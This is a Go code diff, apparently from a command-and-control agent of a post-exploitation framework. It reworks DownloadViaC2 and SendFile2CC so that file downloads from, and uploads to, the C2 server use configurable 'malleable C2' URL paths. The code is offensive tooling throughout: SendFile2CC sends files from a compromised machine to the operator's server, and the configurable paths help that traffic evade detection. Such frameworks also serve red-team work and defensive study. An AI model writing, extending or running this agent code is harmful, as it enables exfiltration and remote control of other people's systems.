@@ -60,7 +60,12 @@ func FetchFile(config *def.Config, download_addr, file_to_download, path, checks
 // DownloadViaC2 download via EmpHTTPClient
 // if path is empty, return []data instead
 func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) (data []byte, err error) {
-	downloadURL := netutil.JoinURL(def.CCAddress, transport.DownloadFile2AgentAPI, url.QueryEscape(config.AgentUUID)) +
+	wwwPath := common.RuntimeConfig.WWWPath
+	prefix := common.RuntimeConfig.C2Prefix
+	if prefix == "" || wwwPath == "" {
+		return nil, fmt.Errorf("missing malleable C2 config: C2Prefix=%q WWWPath=%q", prefix, wwwPath)
+	}
+	downloadURL := netutil.JoinURL(def.CCAddress, prefix, wwwPath, url.QueryEscape(config.AgentUUID)) +
 		"?file_to_download=" + url.QueryEscape(file_to_download)
 	logging.Printf("DownloadViaCC is downloading from %s", downloadURL)
 	retData := false
@@ -208,8 +213,13 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	}
 	data = data[offset:]
 
-	// connect
-	url := netutil.JoinURL(def.CCAddress, transport.Upload2AgentAPI, token)
+	ftpPath := common.RuntimeConfig.FTPPath
+	prefix := common.RuntimeConfig.C2Prefix
+	if prefix == "" || ftpPath == "" {
+		err = fmt.Errorf("missing malleable C2 config: C2Prefix=%q FTPPath=%q", prefix, ftpPath)
+		return
+	}
+	url := netutil.JoinURL(def.CCAddress, prefix, ftpPath, token)
 	conn, _, _, err := EstablishC2Connection(url)
 	logging.Printf("connection: %s", url)
 	if err != nil {
